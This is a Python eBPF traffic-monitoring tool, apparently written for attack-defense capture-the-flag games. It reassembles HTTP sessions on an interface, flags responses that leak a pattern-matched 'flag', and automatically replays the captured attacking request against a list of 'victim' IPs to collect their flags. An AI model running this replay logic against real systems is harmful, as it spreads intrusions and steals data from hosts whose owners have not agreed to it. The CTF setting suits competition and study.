#!/usr/bin/python3
# coding: utf-8

from bcc import BPF
from io import StringIO
import atexit
import pyroute2
import time
import socket
import argparse
import re
import struct
import threading
import urllib3
import email
import zlib
import ctypes as ct

# local dictionary containing session_key => messages (+ utility variables)
local_dictionary = {}
crlf = b"\r\n"                     # CR + LF (substring to find)
http = urllib3.PoolManager()       # urllib3 pool manager for http sessions
EGRESS = 0xfaceb00d                # magic used in eBPF to identify egress
INGRESS = 0xfaceb00c               # magic used in eBPF to identify ingress
ETH_HLEN = 14                      # ethernet header length

# CLI Args
TIMEOUT = None                     # timeout to wait for http request when attacking
OLD_WINDOW = None                  # consider entry old after window time (seconds)
VICTIMS_IPS = None                 # list of victims to attack back
PATTERN = None                     # pattern to look for in the http body


def decodeMessage(message):
    '''Function to decode HTTP message (header + payload).
        Since server specification, header should always be utf-8 (change it if you want),
        while the payload can be compressed using different formats(gzip, deflate, zlib,...).
        Many of them are supported right now, but of course feel free to extend it.
    '''
    
    # payload begins after a white line
    index_payload = message.index(crlf+crlf) + 4
    header = message[:index_payload].decode('utf-8')
    payload = message[index_payload:]
    
    match = re.search('Content-Length: (.*)\\r\\n', header)
    
    if match and int(match.group(1)) >len(payload):
        return header

    if len(message) <= index_payload or len(payload) <= len(b'\x80\xb1'):
        return header

    match = re.search('Content-Encoding: (.*)\\r\\n', header)
    decoded = ''

    if match:
        encoding = match.group(1)
    else:
        match2 = re.search('Content-Type: .*charset=(.+)\\r\\n', header)
        if match2:
            encoding = match2.group(1).lower()
        else:
            encoding = 'utf-8'

    try:
        if encoding == 'gzip':
            decoded = zlib.decompress(
                payload, wbits=zlib.MAX_WBITS | 16).decode('utf-8')
        elif encoding == 'deflate':
            decoded = zlib.decompress(
                payload, wbits=-zlib.MAX_WBITS).decode('utf-8')
        elif encoding == 'zlib':
            decoded = zlib.decompress(
                payload, wbits=zlib.MAX_WBITS).decode('utf-8')
        else:
            decoded = payload.decode(encoding, errors='backslashreplace')
    except Exception:
        print(f'Unable to decode ({encoding}) message')
    return header + decoded


def doAttack(raw):
    '''Function to forward the attack to all the victims'''
    global http

    if not VICTIMS_IPS:
        print("\n>>>>>>>>>>No Victims to Counter Attacks")
        return
        
    # split first line from the rest of the request.
    # the first line contains the request GET HOST HTTP/X.X
    # then there are the headers
    action, headers = raw.split('\r\n', 1)
    message = email.message_from_file(StringIO(headers))
    headers = dict(message.items())
    action = action.split(" ")

    print("\n>>>>>>>>>>Counter Attacks")
    # for each victim spawn a thread to perform the request
    for victim in VICTIMS_IPS:
        t = threading.Timer(
            0, performRequest, (victim, action[0], victim+action[1], headers, message.get_payload(),))
        t.daemon = True
        t.start()


def performRequest(victim, method, url, headers, body):
    '''Function to perform the request to a victim (replay the attack)
    It would be easier forwarding the raw packet through raw socket
    but they are not efficient and optimized, thus a simple GET
    would take more than 3 seconds to send-receive
    '''
    to_print = f"Replay attack to victim {victim} => "
    try:
        headers['Host'] = victim
        res = http.request(method, url, headers=headers,
                           body=body, timeout=TIMEOUT)
        # check if we got the flag from the attack
        match = re.search(PATTERN, res.data.decode('utf-8'))
        if match:
            to_print += match.group(0)
        else:
            to_print += "did not worked"
    except Exception:
        to_print += "did not worked"
    print(to_print)


def clearOldEntriesTask():
    '''Function to clear the local dict from the oldest entries
    (the bpf map will not be cleared since LRU map)
    '''

    global local_dictionary
    curr_time = time.time()
    for key in list(local_dictionary.keys()):
        if local_dictionary[key]['last_check'] + OLD_WINDOW < curr_time:
            del local_dictionary[key]
    t = threading.Timer(OLD_WINDOW, clearOldEntriesTask, ())
    t.daemon = True
    t.start()


def parse_packet(cpu, data, size):
    '''Function to parse a single packet.
    The packet is completely parsed and depending where it comes from (INGRESS/EGRESS)
    it is stored in the apposite local data structure and many checks are performed to
    detect possible leakage (flag)
    '''
    global local_dictionary
    class SkbEvent(ct.Structure):
        _fields_ = [("magic", ct.c_uint32),
                    ("raw", ct.c_ubyte * (size - ct.sizeof(ct.c_uint32)))]

    skb_event = ct.cast(data, ct.POINTER(SkbEvent)).contents

    if skb_event.magic == EGRESS:
        is_from_ingress = False
    elif skb_event.magic == INGRESS:
        is_from_ingress = True
    else:
        print(
            f'Got a packet from cpu {cpu} not from Ingress/Egress (magic={skb_event.magic}), fix this.')
        return
    
    # convert packet into bytearray
    packet_bytearray = bytearray(skb_event.raw)

    # https://tools.ietf.org/html/rfc791
    # calculate packet total length
    total_length = packet_bytearray[ETH_HLEN + 2]  # load MSB
    total_length = total_length << 8  # shift MSB
    total_length = total_length + packet_bytearray[ETH_HLEN+3]  # add LSB

    # calculate ip header length
    ip_header_length = packet_bytearray[ETH_HLEN]  # load Byte
    ip_header_length = ip_header_length & 0x0F  # mask bits 0..3
    ip_header_length = ip_header_length << 2  # shift to obtain length

    # retrieve ip source/dest
    ip_src_str = packet_bytearray[ETH_HLEN +
                                  12:ETH_HLEN+16]  # ip source offset 12..15
    ip_dst_str = packet_bytearray[ETH_HLEN +
                                  16:ETH_HLEN+20]  # ip dest   offset 16..19

    # parsing ip addresses, but leaving them in their byte order (network)
    ip_src = int.from_bytes(ip_src_str, 'little')
    ip_dst = int.from_bytes(ip_dst_str, 'little')

    # https://www.rfc-editor.org/rfc/rfc793.txt
    # calculate tcp header length
    # load Byte
    tcp_header_length = packet_bytearray[ETH_HLEN + ip_header_length + 12]
    tcp_header_length = tcp_header_length & 0xF0  # mask bit 4..7
    tcp_header_length = tcp_header_length >> 2  # SHR 4 ; SHL 2 -> SHR 2

    # retrieve port source/dest
    port_src_str = packet_bytearray[ETH_HLEN +
                                    ip_header_length:ETH_HLEN+ip_header_length+2]
    port_dst_str = packet_bytearray[ETH_HLEN +
                                    ip_header_length+2:ETH_HLEN+ip_header_length+4]

    # parsing ports but leaving them in their byte order (network)
    port_src = int.from_bytes(port_src_str, 'little')
    port_dst = int.from_bytes(port_dst_str, 'little')

    # calculate payload offset
    payload_offset = ETH_HLEN + ip_header_length + tcp_header_length

    # payload_string contains only packet payload
    payload_string = packet_bytearray[(payload_offset):(len(packet_bytearray))]

    # creating the key tuple
    key = (ip_src, ip_dst, port_src, port_dst) if is_from_ingress is False else (
        ip_dst, ip_src, port_dst, port_src)

    if key not in local_dictionary:
        local_dictionary[key] = {
            "done_egress": False,
            "done_ingress": False,
            "egress_messages": [b""],
            "ingress_messages": [b""],
            "last_check": -1
        }
    entry = local_dictionary[key]
    # updating the timestamp of the last usage
    entry["last_check"] = time.time()

    if is_from_ingress:
        # if done then create new entry, otherwise complete the previous one
        if entry['done_ingress'] is True:
            entry['ingress_messages'].append(payload_string)
        else:
            entry['ingress_messages'][-1] += payload_string
        # match: HTTP  packet found
        if crlf in entry['ingress_messages'][-1]:
            entry['done_ingress'] = True
            entry['ingress_messages'][-1] = decodeMessage(entry['ingress_messages'][-1])
        else:
            entry['done_ingress'] = False
    else:
        # if done then create new entry, otherwise complete the previous one
        if entry['done_egress'] is True:
            entry['egress_messages'].append(payload_string)
        else:
            entry['egress_messages'][-1] += payload_string
        # match: HTTP  packet found
        # finished header request
        
        if crlf in entry['egress_messages'][-1]:
            tmp = decodeMessage(entry['egress_messages'][-1])
            if len(tmp) != len(entry['egress_messages'][-1]):
                return
            entry['done_egress'] = True
            print(entry['egress_messages'][-1])
            entry['egress_messages'][-1] = decodeMessage(entry['egress_messages'][-1])
            # check if there's the flag in the answer => attack detected
            if re.search(PATTERN, entry['egress_messages'][-1]):
                print("-------------------------- Attack Detected --------------------------\n"
                      f'From {socket.inet_ntoa(int(key[1]).to_bytes(4, "little"))}:{socket.ntohs(key[3])} '
                      f'To {socket.inet_ntoa(int(key[0]).to_bytes(4, "little"))}:{socket.ntohs(key[2])}\n'
                      f'>>>>>>>>>>Request\n{entry["ingress_messages"][-1]}'
                      f'>>>>>>>>>>Answer\n{entry["egress_messages"][-1]}')
                # start a thread to forward the attack to all the other victims
                doAttack(entry['ingress_messages'][-1])
        else:
            entry['done_egress'] = False

def parseArguments():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument(
        'interface', help='indicates the interface to attach programs', type=str)
    parser.add_argument(
        'pattern', help='the pattern to search for in the http body', type=str)
    parser.add_argument(
        '-t', '--timeout', help='timeout to wait for http request when attacking', type=int, default=3)
    parser.add_argument(
        '-w', '--window', help='consider entry old after window time (seconds)', type=int, default=30)
    parser.add_argument(
        '-s', '--service', help='the ip of the service to protect if any', type=str, default=-1)
    parser.add_argument(
        '-v', '--victims', help='the ip of the victims to forward the attack to', type=str, nargs="*", default=[])
    parser.add_argument(
        '-n', '--n-sessions', help='number of max sessions tracked', type=int, default=1000)
    return parser.parse_args().__dict__


if __name__ == '__main__':
    '''Main function to create and inject programs and start monitoring.'''
    args = parseArguments()

    PATTERN, TIMEOUT, OLD_WINDOW, VICTIMS_IPS = args[
        "pattern"], args["timeout"], args["window"], args["victims"]

    # check if we have to analyze traffic for a specific service or all
    if args["service"] != -1:
        args["service"] = struct.unpack(
            "<L", socket.inet_aton(args["service"]))[0]

    print('Compiling eBPF programs')
    # load BPF program with the variables just set
    b = BPF(src_file="ebpf_filter.c",
            cflags=['-DN_SESSIONS=%s' % args["n_sessions"], "-DSERVICE_IP=%s" % args["service"]])

    # load the compiled functions
    ingress_fn = b.load_func("handle_ingress", BPF.SCHED_CLS)
    egress_fn = b.load_func("handle_egress", BPF.SCHED_CLS)

    print('Attaching programs to chain')
    ip = pyroute2.IPRoute()
    idx = pyroute2.IPDB(nl=ip).interfaces[args["interface"]].index
    # create a class to tag the traffic
    ip.tc("add", "clsact", idx)
    atexit.register(lambda: ip.tc("del", "clsact", idx))
    #ingress tag
    ip.tc("add-filter", "bpf", idx, ":1", fd=ingress_fn.fd, name=ingress_fn.name,
        parent="ffff:fff3", classid=1, direct_action=True)
    #egress tag
    ip.tc("add-filter", "bpf", idx, ":1", fd=egress_fn.fd, name=egress_fn.name,
        parent="ffff:fff2", classid=1, direct_action=True)
    
    # set the function to be called on event
    b["skb_events"].open_perf_buffer(parse_packet)
    # start cleaner thread
    clearOldEntriesTask()

    print("Starting analysis, hit CTRL+C to stop")
    while True:
        try:
            # start listening for buffer events
            b.perf_buffer_poll()
        except KeyboardInterrupt:
            print("Removing filters from device")
            break
